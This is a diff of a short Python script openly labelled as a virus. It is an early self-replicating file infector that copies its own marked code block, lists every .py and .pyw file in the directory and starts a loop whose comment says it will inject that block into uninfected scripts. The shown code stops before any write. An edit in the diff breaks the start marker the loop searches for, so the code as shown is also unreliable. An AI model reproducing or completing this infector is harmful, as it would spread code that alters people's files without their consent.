@@ -1,14 +1,14 @@
-### Start of Virus ###
+#Start of Virus ###
 
 import sys, glob
 
-### Findign the code fo the current file ###
+# Findign the code of the current file ###
 code = []
 with open(sys.argv[0], 'r') as f:
     lines = f.readlines()
 
-### Finding the code of Virus area"
-virus_area = False
+# Finding the code of Virus area"
+virus_area = False  # Beacuse We are not in the virus area ###
 for line in lines:
     if line == '### Start of Virus ###\n':
         virus_area = True
@@ -17,8 +17,13 @@ for line in lines:
     if line == '### End of Virus ###\n':
         break
 
-# ## Finding python scripts  by extensions ('.pyw' is the extension for python scripts that run withour a visible
+# ## Finding python scripts  by extensions ('.pyw' is the extension for python scripts that run without a visible
 # window) ###
 python_scripts = glob.glob('*.py') + glob.glob('*.pyw')
-print(python_scripts)
+
+# Go through all the scripts  and check if infected , if not then inject the  virus code area
+for script in python_scripts:
+    with open(script, 'r') as f: # 'r' = reading mode
+        script_code =f.readlines()
+
 ### End of Virus ###
